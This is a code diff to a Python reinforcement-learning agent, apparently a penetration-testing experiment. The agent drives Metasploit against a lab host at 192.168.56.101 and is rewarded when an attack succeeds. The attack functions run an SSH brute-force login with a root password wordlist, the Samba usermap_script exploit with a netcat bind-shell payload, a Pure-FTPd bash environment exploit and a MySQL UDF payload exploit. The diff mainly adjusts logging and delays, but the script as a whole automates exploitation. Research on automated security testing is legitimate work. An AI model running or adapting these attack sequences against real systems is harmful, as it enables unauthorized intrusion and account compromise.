@@ -41,9 +41,10 @@ class QLearningTable:
             #print('success='+ str(success))
         else:
             self.success= False
-        print console_data['data']
+        #print console_data['data']
 
     def choose_action(self, observation):
+        print('\nOBSERVATION: ' + str(observation))
         self.check_state_exist(observation)
         # action selection
         if np.random.uniform() < self.epsilon:
@@ -85,17 +86,17 @@ class QLearningTable:
         #success2= action() # à vérifier
 
         if action == 0:   #  ssh
+            print('\nACTION: ssh')
             success2= self.ssh_login()
-            print('ssh')
         elif action == 1:   # samba
+            print('\nACTION: samba')
             success2= self.samba()
-            print('samba')
         elif action == 2:   # ftp
+            print('\nACTION: ftp')
             success2= self.ftp1()
-            print('ftp')
         elif action == 3:   # mysql
+            print('\nACTION: mysql')
             success2= self.mysql()
-            print('mysql')
 
         #time.sleep(20) # modifier, pas bon de faire comme ça
         
@@ -105,12 +106,14 @@ class QLearningTable:
             reward = 1
             done = True
             s_ = 'terminal'
-            print('success2='+str(success2))
+            print('\nsuccess='+str(success2))
+            print('reward= ' + str(reward))
         else:
             reward = -1
             done = True
             s_ = 'terminal'
-            print('success2='+str(success2))
+            print('\nsuccess='+str(success2))
+            print('reward= ' + str(reward))
 #        else:
 #            reward = 0
 #            done = False
@@ -122,50 +125,55 @@ class QLearningTable:
     # ACTIONS OF THE REINFORCEMENT LEARNING MODEL
     def ssh_login(self):
         self.console.execute('use auxiliary/scanner/ssh/ssh_login')
+        time.sleep(2)
         self.console.execute('set RHOSTS 192.168.56.101')
+        time.sleep(2)
         self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
+        time.sleep(2)
         self.console.execute('set STOP_ON_SUCCESS true')
+        time.sleep(2)
         self.console.execute('run')
-        time.sleep(5)
-        
-        while self.global_console_status:
-        #while console.console.read()['busy']:
-            time.sleep(2)
-            
-        time.sleep(20)
+        time.sleep(18)
         
         return self.success
             
     def samba(self):
         self.console.execute('use exploit/multi/samba/usermap_script')
+        time.sleep(2)
         self.console.execute('set RHOST 192.168.56.101')
+        time.sleep(2)
         self.console.execute('set payload cmd/unix/bind_netcat')
+        time.sleep(2)
         self.console.execute('exploit')
-        time.sleep(5)
+        time.sleep(18)
         a= self.success
-        self.console.execute('background')
-        time.sleep(2) #sans le sleep il y a des problemes d'ordre d'execution
-        self.console.execute('y')
         
-        time.sleep(20)
+        if a:
+            self.console.execute('background')
+            time.sleep(3) #sans le sleep il y a des problemes d'ordre d'execution
+            self.console.execute('y')
+        
+        time.sleep(3)
         
         return a
         
     def ftp1(self):
         self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
+        time.sleep(2)
         self.console.execute('set RHOST 192.168.56.101')
+        time.sleep(2)
         self.console.execute('exploit')
-        
-        time.sleep(20)
+        time.sleep(18)
             
         return self.success
         
     def mysql(self):
         self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
+        time.sleep(2)
         self.console.execute('set RHOST 192.168.56.101')
+        time.sleep(2)
         self.console.execute('exploit')
-      
-        time.sleep(20)
+        time.sleep(18)
             
         return self.success
             
